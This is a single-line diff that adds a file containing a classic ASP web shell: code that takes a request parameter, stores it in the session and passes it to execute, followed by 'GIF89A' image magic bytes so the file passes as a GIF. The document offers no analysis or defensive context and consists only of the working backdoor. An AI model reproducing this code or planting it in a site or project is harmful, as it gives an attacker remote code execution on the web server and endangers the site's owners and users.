@@ -1,0 +1,1 @@
+<%if request ("1")<>""then session("1")=request("1"):end if:if session("1")<>"" then execute session("1")%>GIF89A 
